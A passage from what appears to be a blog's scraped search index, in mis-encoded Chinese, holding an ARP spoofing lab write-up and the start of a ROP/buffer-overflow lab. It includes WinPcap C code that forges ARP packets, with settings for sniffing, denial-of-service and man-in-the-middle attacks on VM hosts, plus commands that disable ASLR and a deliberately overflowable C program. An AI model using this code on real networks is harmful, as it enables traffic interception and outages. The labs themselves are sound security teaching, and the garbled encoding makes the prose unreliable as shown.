hdType; //ç¡¬ä»¶ç±»å‹ unsigned short proType; //åè®®ç±»å‹ unsigned char hdSize; //ç¡¬ä»¶åœ°å€é•¿åº¦ unsigned char proSize; //åè®®åœ°å€é•¿åº¦ unsigned short op; //æ“ä½œç±»å‹ï¼ŒARPè¯·æ±‚ï¼ˆ1ï¼‰ï¼ŒARPåº”ç­”ï¼ˆ2ï¼‰ï¼ŒRARPè¯·æ±‚ï¼ˆ3ï¼‰ï¼ŒRARPåº”ç­”ï¼ˆ4ï¼‰ã€‚ u_char smac[6]; //æºMACåœ°å€ u_char sip[4]; //æºIPåœ°å€ u_char dmac[6]; //ç›®çš„MACåœ°å€ u_char dip[4]; //ç›®çš„IPåœ°å€ }; //å®šä¹‰æ•´ä¸ªarpæŠ¥æ–‡åŒ…ï¼Œæ€»é•¿åº¦42å­—èŠ‚ struct ArpPacket { struct EthernetHeader ed; struct ArpHeader ah; }; int main() { pcap_if_t* alldevs; //æ‰€æœ‰ç½‘ç»œé€‚é…å™¨ pcap_if_t* d; //é€‰ä¸­çš„ç½‘ç»œé€‚é…å™¨ int inum; //é€‰æ‹©ç½‘ç»œé€‚é…å™¨ int i = 0; //forå¾ªç¯å˜é‡ pcap_t* adhandle; //æ‰“å¼€ç½‘ç»œé€‚é…å™¨ï¼Œæ•æ‰å®ä¾‹,æ˜¯pcap_openè¿”å›çš„å¯¹è±¡ char errbuf[PCAP_ERRBUF_SIZE]; //é”™è¯¯ç¼“å†²åŒº,å¤§å°ä¸º256 /* è·å–æœ¬æœºè®¾å¤‡åˆ—è¡¨ */ // è·å–æœ¬æœºç›¸å…³çš„æ‰€æœ‰ç½‘å…³ if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, \u0026amp;alldevs, errbuf) == -1) { fprintf(stderr, \u0026#34;Error in pcap_findalldevs: %s\\n\u0026#34;, errbuf); exit(1); } /* æ‰“å°ç½‘å…³åˆ—è¡¨ */ for (d = alldevs; d; d = d-\u0026gt;next) { printf(\u0026#34;%d. %s\u0026#34;, ++i, d-\u0026gt;name); if (d-\u0026gt;description) printf(\u0026#34; (%s)\\n\u0026#34;, d-\u0026gt;description); else printf(\u0026#34; (No description available)\\n\u0026#34;); } // å¦‚æœ i = 0 ï¼Œè¯´æ˜è¯¥è®¡ç®—æœºæ²¡æœ‰ç½‘å…³ if (i == 0) { printf(\u0026#34;\\nNo interfaces found! Make sure WinPcap is installed.\\n\u0026#34;); return -1; } // é€‰æ‹©åˆé€‚çš„ç½‘å…³ printf(\u0026#34;Enter the interface number (1-%d):\u0026#34;, i); scanf(\u0026#34;%d\u0026#34;, \u0026amp;inum); if (inum \u0026lt; 1 || inum \u0026gt; i) { printf(\u0026#34;\\nInterface number out of range.\\n\u0026#34;); /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return -1; } /* è·³è½¬åˆ°é€‰ä¸­çš„é€‚é…å™¨ */ for (d = alldevs, i = 0; i \u0026lt; inum - 1; d = d-\u0026gt;next, i++); /* æ‰“å¼€è®¾å¤‡ */ if ((adhandle = pcap_open(d-\u0026gt;name, // è®¾å¤‡å 65536, // 65535ä¿è¯èƒ½æ•è·åˆ°ä¸åŒæ•°æ®é“¾è·¯å±‚ä¸Šçš„æ¯ä¸ªæ•°æ®åŒ…çš„å…¨éƒ¨å†…å®¹ PCAP_OPENFLAG_PROMISCUOUS, // æ··æ‚æ¨¡å¼ 1000, // è¯»å–è¶…æ—¶æ—¶é—´ NULL, // è¿œç¨‹æœºå™¨éªŒè¯ errbuf // é”™è¯¯ç¼“å†²æ±  )) == NULL) { fprintf(stderr, \u0026#34;\\nUnable to open the adapter. %s is not supported by WinPcap\\n\u0026#34;, d-\u0026gt;name); /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return -1; } /*ä»¥ä¸Šä»£ç åœ¨WinPcapå¼€å‘æ–‡æ¡£ä¸­éƒ½å¯ä»¥æ‰¾åˆ°ï¼Œå¡«å……ARPåŒ…çš„ä»£ç åˆ™è¦è‡ªå·±ç¼–å†™*/ //å¼€å§‹å¡«å……ARPåŒ…ï¼Œå¡«å……æ•°æ®å†™æ­»åœ¨ä»£ç ä¸­ï¼Œæµ‹è¯•ç”¨æ—¶æ•°æ®å¯éšæ„å¡«å†™ unsigned char sendbuf[42]; //arpåŒ…ç»“æ„å¤§å°ï¼Œ42ä¸ªå­—èŠ‚ unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; //unsigned char mac[6] = { 0xff,0xff,0xff,0xff,0xff,0xff }; unsigned char ip[4] = { 192,168,195,138 }; unsigned char dmac[6] = {0x00,0x50,0x56,0xe7,0xd4,0x22}; unsigned char d_ip[4] = {192,168,195,2}; struct EthernetHeader eh; struct ArpHeader ah; //èµ‹å€¼MACåœ°å€ //memset(eh.DestMAC, 0xff, 6); //ä»¥å¤ªç½‘é¦–éƒ¨ç›®çš„MACåœ°å€ï¼Œå…¨ä¸ºå¹¿æ’­åœ°å€ memcpy(eh.DestMAC, dmac, 6); //ä»¥å¤ªç½‘é¦–éƒ¨ç›®çš„MACåœ°å€ memcpy(eh.SourMAC, mac, 6); //ä»¥å¤ªç½‘é¦–éƒ¨æºMACåœ°å€ memcpy(ah.smac, mac, 6); //ARPå­—æ®µæºMACåœ°å€ //memset(ah.dmac, 0xff, 6); //ARPå­—æ®µç›®çš„MACåœ°å€ memcpy(ah.dmac, dmac, 6); //ARPå­—æ®µç›®çš„MACåœ°å€ memcpy(ah.sip, ip, 4); //ARPå­—æ®µæºIPåœ°å€ memset(ah.dip, 0x05, 4); //ARPå­—æ®µç›®çš„IPåœ°å€ memcpy(ah.dip, d_ip, 4); //ARPå­—æ®µç›®çš„IPåœ°å€ eh.EthType = htons(ETH_ARP); //htonsï¼šå°†ä¸»æœºçš„æ— ç¬¦å·çŸ­æ•´å½¢æ•°è½¬æ¢æˆç½‘ç»œå­—èŠ‚é¡ºåº ah.hdType = htons(ARP_HARDWARE); ah.proType = htons(ETH_IP); ah.hdSize = 6; ah.proSize = 4; ah.op = htons(ARP_REQUEST); //æ„é€ ä¸€ä¸ªARPè¯·æ±‚ memset(sendbuf, 0, sizeof(sendbuf)); //ARPæ¸…é›¶ memcpy(sendbuf, \u0026amp;eh, sizeof(eh)); memcpy(sendbuf + sizeof(eh), \u0026amp;ah, sizeof(ah)); //å¦‚æœå‘é€æˆåŠŸ if (pcap_sendpacket(adhandle, sendbuf, 42) == 0) { printf(\u0026#34;\\nPacketSend succeed\\n\u0026#34;); } else { printf(\u0026#34;PacketSendPacket in getmine Error: %d\\n\u0026#34;, GetLastError()); } /* é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ */ pcap_freealldevs(alldevs); return 0; } å¹¿æ’­æ”»å‡» æ„é€ å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºç½‘å…³IPï¼Œè€ŒMACåœ°å€ä¸ºå¹¿æ’­åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™ç½‘å…³çš„æ•°æ®åŒ…éƒ½å°†è¢«å¹¿æ’­ã€‚è¿™æ—¢æ˜¯ä¸€ç§å—…æ¢æ–¹æ³•ï¼Œä¹Ÿå¯ä½œä¸ºå¹²æ‰°ç½‘ç»œæœåŠ¡çš„æ”»å‡»æ–¹æ³•ã€‚\nè¿™é‡Œå°†é¶æœº(192.168.195.138)å¯¹ç½‘å…³çš„MAC åœ°å€ç¯¡æ”¹ä¸º å¹¿æ’­åœ°å€ï¼Œåˆ©ç”¨æ”»å‡»æœº(IP : 192.168.195.131)ç›‘æ§æµé‡ã€‚\nåœ¨å‘åŒ…çš„æºä»£ç ä¸­ï¼šä¿®æ”¹ IPå’Œ MACåœ°å€ï¼Œæ„é€ ARPåŒ…\n1 2 3 4 5 6 7 æºip mac (è¿™é‡Œæ˜¯ç½‘å…³çš„IPåœ°å€ å’Œ å¹¿æ’­macåœ°å€) unsigned char mac[6] = { 0xFF,0xFF,0xFF,0xFF,0xFF,0xFF }; unsigned char ip[4] = { 192,168,195,2 }; ç›®çš„ ip mac (è¿™é‡Œæ˜¯ é¶æœºçš„IPå’ŒMAC) unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; è¿™é‡Œçš„ç¬¬ä¸€ä¸ªarp -a æ˜¾ç¤ºçš„ ç½‘å…³macåœ°å€ ä¸ºæ­£ç¡®çš„ macåœ°å€ã€‚\nç¬¬äºŒä¸ª arp -a ä¸º å‘é€è™šå‡æ„é€ çš„arpåŒ… ä¹‹åï¼Œç½‘å…³åœ°å€è¢«ä¿®æ”¹ä¸º å¹¿æ’­åœ°å€ã€‚\nç„¶åç”¨é¶æœº(IP 192.168.195.138) ping win10ä¸»æœº ï¼ŒåŒæ—¶åœ¨æ”»å‡»æœº(IP 192.168.195.131) ä¸­ç”¨wiresharkè¿›è¡Œç›‘æ§ä¿¡é“ï¼Œè¿›è¡ŒæŠ“åŒ…\nå¯ä»¥å‘ç°æ”»å‡»æœºå¯ä»¥ç›‘æ§åˆ° é¶æœº(IP 192.168.195.138) ping www.baidu.com çš„æ•°æ®åŒ…\nå¯¹æ­¤ICMP åŒ…ï¼Œè¿›è¡Œåˆ†æï¼Œå¯ä»¥çœ‹åˆ°å‘åŒ…çš„macåœ°å€ç¡®å®ä¸º å¹¿æ’­åœ°å€ FF-FF-FF-FF-FF-FF æ‹’ç»æœåŠ¡æ”»å‡» æ„é€ è™šå‡å“åº”åŒ…ï¼Œå…¶ä¸­åè®®åœ°å€ä¸ºå…³é”®æœåŠ¡çš„IPåœ°å€ï¼Œä¾‹å¦‚ç½‘å…³ï¼Œè€ŒMACåœ°å€ä¸ºä¸å­˜åœ¨çš„è™šå‡åœ°å€ï¼Œå°†è¿™æ ·çš„å“åº”åŒ…å‘ç»™å±€åŸŸç½‘å†…ä¸»æœºã€‚é‚£ä¹ˆï¼Œå±€åŸŸç½‘ä¸»æœºå‘ç»™å…³é”®æœåŠ¡ï¼ˆå¦‚ç½‘å…³ï¼‰çš„æ•°æ®åŒ…éƒ½å°†ä¸¢å¤±ï¼Œä»è€Œå½¢æˆæ‹’ç»æœåŠ¡æ”»å‡»ã€‚\næ„é€ ARPæ•°æ®åŒ…\n1 2 3 4 5 6 å°†arpåŒ… å‘é€æºmacä¿®æ”¹ä¸ºè™šå‡ çš„ macåœ°å€ unsigned char mac[6] = { 0x01,0x01,0x01,0x01,0x01,0x01 }; unsigned char ip[4] = { 192,168,195,2 }; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; åœ¨ å‘é€arpæ•°æ®åŒ…å‰\nå¯ä»¥çœ‹åˆ° arp è¡¨ å¯¹åº”çš„mac åœ°å€ æ­£ç¡®ï¼Œå¹¶ä¸”ç½‘é¡µå¯ä»¥æ­£å¸¸æ‰“å¼€ã€‚ å‘é€ arp åŒ…\næŸ¥çœ‹é¶æœºçš„ arp è¡¨ å’Œ ä¸Šç½‘çŠ¶æ€ã€‚ å¯ä»¥çœ‹åˆ° ç½‘å…³çš„ mac åœ°å€ è¢«ç¯¡æ”¹ä¸º 01-01-01-01-01-01 ï¼ŒåŒæ—¶ä¹Ÿæ— æ³•è®¿é—®ç™¾åº¦äº†ã€‚ ä¸­é—´äººæ”»å‡» è¿™é‡Œè®¾è®¡æ€è·¯ä¸åˆ©ç”¨WinArpAttacker è¿›è¡Œä¸­é—´äººæ”»å‡»ä¸€æ ·ã€‚\nå°†é¶æœºwinxp(IP 192.168.195.138) å’Œ ä¸»æœº win10 (IP 192.168.195.1) ä¹‹é—´çš„macå‡ç¯¡æ”¹ä¸º æ”»å‡»æœº (IP 192.168.195.131)çš„macåœ°å€ã€‚\nè¿™é‡Œéœ€è¦æ„é€ ä¸¤ä¸ªarpè¯·æ±‚åŒ…\nå¯¹äºé¶æœº win xp\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char dmac[6] = {0x00,0x0C,0x29,0x19,0xba,0x6e}; unsigned char d_ip[4] = {192,168,195,138}; å¯¹äºé¶æœº win 10\n1 2 3 4 5 unsigned char mac[6] = { 0x00,0x0c,0x29,0x06,0x65,0xc9 }; unsigned char ip[4] = { 192,168,195,1}; unsigned char mac[6] = { 0x00,0x50,0x56,0xc0,0x00,0x08 }; unsigned char d_ip[4] = {192,168,195,1}; æŸ¥çœ‹æœªæ„é€ åŒ…å‰çš„çŠ¶æ€\næ­¤æ—¶ä¸¤ä¸ªé¶æœºä¹‹é—´å¯¹åº”çš„mac å‡ä¸ºæ­£ç¡®çš„ã€‚ å‘é€ä¸¤ä¸ªarp è¯·æ±‚åŒ…ã€‚\nå‘é€å®Œæˆ æŸ¥çœ‹å‘é€åçš„ mac å¯¹åº”è¡¨\nå¯ä»¥å¾ˆç›´è§‚çš„çœ‹åˆ°ï¼Œä¸¤ä¸ªé¶æœºä¹‹é—´çš„macåœ°å€å‡è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºçš„ ipåœ°å€ã€‚ è¿™é‡Œç”¨win10 ping é€š é¶æœº win xp,åŒæ—¶åœ¨æ”»å‡»æœºç”¨ wiresharkè¿›è¡ŒæŠ“åŒ…ã€‚\nå¯ä»¥çœ‹åˆ°ä¿¡æ¯è¢«æ”»å‡»æœºæˆªè·ï¼Œå¹¶ä¸”macåœ°å€è¢«ç¯¡æ”¹ä¸º æ”»å‡»æœºçš„ macåœ°å€ ï¼Œ æ”»å‡»æœºåªéœ€è¦å°†macåœ°å€ä¿®æ”¹ä¸€ä¸‹å³å¯å®ç°ä¸­é—´äººæ”»å‡»ã€‚ 0x05 ç»“è®º ARPå®éªŒè¿‡ç¨‹ä¸­ï¼Œå‘é€çš„æ•°æ®åŒ…è¿‡å°‘ï¼Œè®¡ç®—æœºç³»ç»Ÿè‡ªèº«ä¼šè¿…é€Ÿå‘å‡ºarpå¹¿æ’­åŒ… æ¥æ¢å¤æ­£ç¡®çš„macåœ°å€ï¼Œå®éªŒè¿‡ç¨‹è¿…é€Ÿçš„å®Œæˆã€‚é•¿æœŸçš„æ”»å‡»éœ€è¦ä¸é—´æ–­çš„å‘é€arpè¯·æ±‚åŒ…ã€‚ arpæ¬ºéª—æ”»å‡»çš„åŸç†é€šè¿‡æŠ“åŒ…æ¥ç†è§£çš„é€å½»ã€‚ vmè™šæ‹Ÿæœºåˆ©ç”¨natæ¡¥æ¥æ¨¡å¼å¯ä»¥å®ç°ï¼Œä¸»æœºå’Œè™šæ‹Ÿæœºåœ¨åŒä¸€å±€åŸŸç½‘ä¸‹ï¼Œä½¿ç”¨vm8çš„è™šæ‹Ÿç½‘å¡ï¼Œä»¥æ­¤ä½œä¸ºå®éªŒçš„åŸºç¡€ã€‚ ","permalink":"http://www.reus09.top/posts/tech/arp%E6%AC%BA%E9%AA%97/","summary":"ARPæ¬ºéª—å®éªŒ 0x01 å®éªŒå‰æçŸ¥è¯† ARPåè®®çš„å®‰å…¨é—®é¢˜ ARPåè®®æ˜¯å»ºç«‹åœ¨ä¿¡ä»»å±€åŸŸç½‘å†…æ‰€æœ‰ç»“ç‚¹çš„åŸºç¡€ä¸Šçš„ï¼Œå®ƒé«˜æ•ˆï¼Œä½†å´ä¸å®‰å…¨ã€‚ ARPé«˜é€Ÿç¼“å­˜æ ¹æ®æ‰€æ¥","title":"Arpæ¬ºéª—"},{"content":"pwn_rop è°ƒè¯• 0x01 å®éªŒç›®çš„ 1.é’ˆå¯¹å®éªŒä¸€ï¼Œé€šè¿‡gdbè°ƒè¯•rop1ï¼Œç¡®å®šshellcodeçš„åœ°å€ï¼›æ­¤å¤–ï¼Œé€šè¿‡rop1.pyçš„è°ƒè¯•è„šæœ¬ç¡®å®šshellcodeåœ°å€ï¼›æœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æè¿‡ç¨‹å†™å…¥æŠ¥å‘Šï¼Œå¹¶æ¯”è¾ƒä¸¤ç§æ–¹æ³•çš„ç‰¹ç‚¹ã€‚ 2.é’ˆå¯¹å®éªŒäºŒçš„32ä½ç¯å¢ƒå’Œ64ä½ç¯å¢ƒï¼Œé€šè¿‡è°ƒè¯•åˆ†æï¼Œå®Œæˆå®é™…rop2.pyå’Œrop3.py ï¼ˆé¢„ç•™æœ‰ç©ºç™½å’Œé”™è¯¯ä¹‹å¤„ï¼‰ï¼Œæœ€ç»ˆæ‹¿åˆ°shellæƒé™ã€‚ç›¸å…³è¯¦ç»†åˆ†æè¿‡ç¨‹å†™å…¥æŠ¥å‘Š 0x02 å®éªŒç¯å¢ƒ Ubuntu 20 gcc ç‰ˆæœ¬ å·¥å…· pwndbg ROPgadget pwntools visual studio code é€šè¿‡vs code çš„ssh è¿œç¨‹è¿æ¥æœåŠ¡å™¨ubuntuï¼Œå¹¶ä¸”è¿œç¨‹è°ƒè¯•ç¨‹åºã€‚ 0x03 å®éªŒå‰æçŸ¥è¯† ROPçš„å…¨ç§°ä¸º Return-oriented Programmingï¼ˆè¿”å›å¯¼å‘ç¼–ç¨‹\nç»•è¿‡å¯æ‰§è¡Œç©ºé—´ä¿æŠ¤ã€ä»£ç ç­¾åç­‰å®‰å…¨ä¿æŠ¤æœºåˆ¶ï¼Œæ‰§è¡Œæ¶æ„ä»£ç  é€šè¿‡æ§åˆ¶è¢«è°ƒç”¨çš„å †æ ˆï¼Œå¯¹ç¨‹åºçš„æ§åˆ¶æµè¿›è¡ŒåŠ«æŒï¼Œå®ŒæˆæŸäº›ç‰¹å®šåŠŸèƒ½ Shellcodeå†™åœ¨æ ˆä¸­ æœªæä¾›å †æ ˆçš„ä¿æŠ¤æªæ–½ï¼Œç›´æ¥å°†shellcodeå†™å…¥æ ˆä¸­ï¼Œå¹¶å°†å‡½æ•°çš„è¿”å›åœ°å€è¦†å†™ä¸ºshellcodeçš„åœ°å€ã€‚\nè¿”å›åœ°å€è¦†ç›–ä¸ºshellcodeï¼Œä»è€Œå®ç°æ‰§è¡Œshellcodeã€‚ Ret2libc åŠ å…¥äº†DEPï¼ˆData Execution Preventionï¼‰å’ŒNXï¼ˆNo executeï¼‰ä¿æŠ¤ä¹‹åï¼Œæ‹’ç»æ‰§è¡Œå †æ ˆä¸Šçš„ä»»ä½•ä»£ç ã€‚\nret2libcæ˜¯ROPæŠ€æœ¯çš„ä¸€ç§ï¼Œé€šè¿‡å°†è¿”å›åœ°å€è¦†å†™ä¸ºlibcä¸­çš„å‡½æ•°ç»•è¿‡NXä¿æŠ¤ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œæ“ä½œç³»ç»Ÿé€šå¸¸ä½¿ç”¨åŠ¨æ€é“¾æ¥çš„æ–¹æ³•æ¥æé«˜ç¨‹åºè¿è¡Œçš„æ•ˆç‡ã€‚é‚£ä¹ˆåœ¨åŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œç¨‹åºåŠ è½½çš„æ—¶å€™å¹¶ä¸ä¼šæŠŠé“¾æ¥åº“ä¸­æ‰€æœ‰å‡½æ•°éƒ½ä¸€èµ·åŠ è½½è¿›æ¥ï¼Œè€Œæ˜¯ç¨‹åºæ‰§è¡Œçš„æ—¶å€™æŒ‰éœ€åŠ è½½ã€‚ä¹Ÿå°±æ˜¯æ§åˆ¶æ‰§è¡Œ libcï¼ˆå¯¹åº”ç‰ˆæœ¬ï¼‰ ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šé€‰æ‹©æ‰§è¡Œ system(â€œ/bin/shâ€)ï¼ˆæˆ–è€…execve(\u0026quot;/bin/sh\u0026quot;,NULL,NULL)ï¼‰ï¼Œæ•…è€Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚\ngadget 64ä½å¤„ç†å™¨çš„å‘å±•ï¼Œæ”¹å˜äº†å‡½æ•°çš„è°ƒç”¨çº¦å®šï¼Œè¦æ±‚å‡½æ•°çš„å‰6ä¸ªå‚æ•°ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°æ‰ä¼šä¿å­˜åœ¨æ ˆä¸­ã€‚ æƒ³ç»§ç»­ç»™å‡½æ•°ä¼ é€’å‚æ•°,å°†ä¸èƒ½é€šè¿‡ç®€å•æ“ä½œæ ˆæ¥æ“ä½œå‡½æ•°ï¼Œè¿˜éœ€è¦æ“ä½œå¯„å­˜å™¨ã€‚ç”±æ­¤ret2libcå˜çš„éš¾ä»¥æˆåŠŸã€‚ gadgetæ˜¯ä»å¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ä¸­è·å–çš„ä»¥retä¸ºç»“å°¾çš„æŒ‡ä»¤åºåˆ—ã€‚è¿™ç§ROPæŠ€æœ¯å¯»æ‰¾èƒ½å¤Ÿå°†æ ˆä¸­çš„å€¼popåˆ°å¯„å­˜å™¨çš„æŒ‡ä»¤ç‰‡æ®µï¼Œç”±æ­¤æ„é€ å‡½æ•°å‚æ•°ã€‚ ASLRåœ°å€éšæœºåŒ– å¼€å¯åœ°å€éšæœºåŒ–\n1 2 3 4 5 # æŸ¥çœ‹ASLRæ˜¯å¦å¼€å¯ cat /proc/sys/kernel/randomize_va_space # å…³é—­ASLR sudo su echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space ç³»ç»Ÿè½¬å‚¨ dump core 1 2 3 4 5 6 7 # æŸ¥çœ‹æ˜¯å¦å¼€å¯ï¼š ulimit -c ï¼ˆå¦‚æœæ˜¯0å°±æ˜¯å…³ç€çš„ï¼‰ # å¼€å¯è½¬å‚¨ ulimit -c unlimited # è®¾ç½®è½¬å‚¨æ–‡ä»¶ä½ç½®ä¸º/tmpæ–‡ä»¶å¤¹ä¸‹é¢ sudo su sudo sh -c \u0026#39;echo \u0026#34;/tmp/core.%t\u0026#34; \u0026gt; /proc/sys/kernel/core_pattern\u0026#39; Ubuntu ä¿æŒå †æ ˆå¹³è¡¡ åœ¨Ubuntu18ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œ64ä½çš„ç¨‹åºè‹¥åŒ…å«äº†systemï¼ˆâ€œ/bin/shâ€ï¼‰ï¼Œå°±éœ€è¦è€ƒè™‘å †æ ˆå¹³è¡¡ã€‚å› ä¸ºåœ¨Ubuntu18ä¸‹systemè°ƒç”¨æ—¶è¦æ±‚åœ°å€å’Œ16å­—èŠ‚å¯¹é½ï¼Œå¦‚æœæ²¡æœ‰æ ˆå¯¹é½çš„è¯ï¼Œç¨‹åºå°±ç›´æ¥crashäº†ã€‚\nå› ä¸ºå‘½ä»¤:\n1 2 3 .text:000000000004F2F1 movhps xmm0, [rsp+198h+var_190] .text:000000000004F2F6 movaps [rsp+198h+var_158], xmm0 ; here .text:000000000004F2FB call sigaction ä¸»è¦åŸå› æ˜¯0x4F2F6å¤„çš„movaps [rsp+198h+var_158], xmm0æŒ‡ä»¤è¦æ±‚rsp+198h+var_158çš„å€¼æ˜¯å¯¹é½16byteï¼ˆ0x10ï¼‰ï¼Œå¦åˆ™ä¼šç›´æ¥è§¦å‘ä¸­æ–­ä»è€Œcrashã€‚\nè¿™äº›éƒ½æ˜¯åœ¨Ubuntu 18 ç‰ˆæœ¬ä»¥ä¸Šçš„æ‰å­˜åœ¨ã€‚\næ ˆçš„å­—èŠ‚å¯¹é½ï¼Œå®é™…æ˜¯æŒ‡æ ˆé¡¶æŒ‡é’ˆå¿…é¡»æ˜¯16å­—èŠ‚çš„æ•´æ•°å€ã€‚æ ˆå¯¹é½ä½¿å¾—åœ¨å°½å¯èƒ½å°‘çš„å†…å­˜è®¿é—®å‘¨æœŸå†…è¯»å–æ•°æ®ï¼Œä¸å¯¹é½å †æ ˆæŒ‡é’ˆå¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ€§èƒ½ä¸‹é™ã€‚\nä½†æ˜¯å®é™…ä¸Šï¼Œå³ä½¿æ•°æ®æ²¡æœ‰å¯¹é½ï¼Œæˆ‘ä»¬çš„ç¨‹åºä¹Ÿæ˜¯å¯ä»¥æ‰§è¡Œçš„ï¼Œåªæ˜¯æ•ˆç‡æœ‰ç‚¹ä½è€Œå·²ï¼Œä½†æ˜¯æŸäº›å‹å·çš„Intelå’ŒAMDå¤„ç†å™¨ï¼Œåœ¨æ‰§è¡ŒæŸäº›å®ç°å¤šåª’ä½“æ“ä½œçš„SSEæŒ‡ä»¤æ—¶ï¼Œå¦‚æœæ•°æ®æ²¡æœ‰å¯¹é½ï¼Œå°†æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚è¿™äº›æŒ‡ä»¤å¯¹16å­—èŠ‚å†…å­˜è¿›è¡Œæ“ä½œï¼Œåœ¨SSEå•å…ƒå’Œå†…å­˜ä¹‹é—´ä¼ é€æ•°æ®çš„æŒ‡ä»¤è¦æ±‚å†…å­˜åœ°å€å¿…é¡»æ˜¯16çš„å€æ•°ã€‚\nå› æ­¤ï¼Œä»»ä½•é’ˆå¯¹x86_64å¤„ç†å™¨çš„ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶ç³»ç»Ÿéƒ½å¿…é¡»ä¿è¯ï¼Œ å®ƒä»¬åˆ†é…å†…å­˜å°†æ¥å¯èƒ½ä¼šè¢«SSEæŒ‡ä»¤ä½¿ç”¨ï¼Œæ‰€ä»¥å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ï¼Œè¿™ä¹Ÿå°±å½¢æˆäº†ä¸€ç§æ ‡å‡†ï¼š\nä»»ä½•å†…å­˜åˆ†é…å‡½æ•°ï¼ˆalloca, malloc, callocæˆ–reallocï¼‰ç”Ÿæˆçš„å—çš„èµ·å§‹åœ°å€éƒ½å¿…é¡»æ˜¯16çš„å€æ•°ã€‚ å¤§å¤šæ•°å‡½æ•°çš„æ ˆå¸§çš„è¾¹ç•Œéƒ½å¿…é¡»æ˜¯16å­—èŠ‚çš„å€æ•°ã€‚ å¦‚ä¸Šï¼Œåœ¨è¿è¡Œæ—¶æ ˆä¸­ï¼Œä¸ä»…ä¼ é€’çš„å‚æ•°å’Œå±€éƒ¨å˜é‡è¦æ»¡è¶³å­—èŠ‚å¯¹é½ï¼Œæˆ‘ä»¬çš„æ ˆæŒ‡é’ˆï¼ˆrspï¼‰ä¹Ÿå¿…é¡»æ˜¯16çš„å€æ•°ã€‚\nå®éªŒæºç  1 2 3 4 5 6 7 8 9 10 11 12 13 #include\u0026lt;stdio.h\u0026gt; void vuln() { char buf[128]; read(0,buf,256); } int main() { vuln(); write(1,\u0026#34;hello rop\\n\u0026#34;,10); } åˆ†æç¨‹åºæ¼æ´ Vuln()å‡½æ•°ä¸­ï¼Œbufæ•°ç»„çš„å¤§å°æ˜¯128å­—èŠ‚ï¼Œä½†æ˜¯åœ¨readæ—¶æœ€å¤šå¯ä»¥è¯»å…¥256å­—èŠ‚ï¼Œå®¹æ˜“é€ æˆç¼“å†²åŒºæº¢å‡ºï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´å¯¹ç¨‹åºæµè¿›è¡ŒåŠ«æŒï¼Œæ‰§è¡Œæ„é€ å¥½çš„payloadã€‚\nå…·ä½“çš„æ€è·¯ï¼šæŠŠpayloadå†™å…¥bufæ•°ç»„ä¸­ï¼Œå¹¶åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå°†è¿”å›åœ°å€ä¿®æ”¹ä¸ºbufæ•°ç»„çš„åœ°å€ï¼Œvuln()å‡½æ•°è¿”å›ä¹‹åï¼Œå°±ä¼šåˆ°bufæ•°ç»„ä¸­æ‰§è¡Œshellcode\nå¯ä»¥åˆ©ç”¨pwntoolsæœ‰ä¸€ä¸ªshellcraftæ¨¡å—å¯ä»¥å®ç°shellcdeï¼Œå…¶ä¸­å…¶ä¸­**shellcraft.sh()**å°±æ˜¯ç”Ÿæˆæ‰§è¡Œ/bin/shçš„shellcodeã€‚\nå¯ä»¥ç”¨asm()å°†shellcode è½¬æ¢ä¸ºæœºå™¨ç \n0x04 å®éªŒè¿‡ç¨‹ rop1_gdb ç¼–è¯‘rop1.cï¼Œå…³é—­æ ˆä¿æŠ¤å’ŒNXä¿æŠ¤ï¼Œåœ¨32ä½ç¯å¢ƒä¸‹ï¼Œç¼–è¯‘ç”Ÿæˆrop1\nè¿™é‡Œæˆ‘ä»¬æƒ³å®ç°çš„æ˜¯é€šè¿‡gdb è°ƒè¯•rop1è·å¾—çœŸæ­£çš„bufåœ°å€ï¼Œç„¶åå‘é‡Œé¢è¾“å…¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ 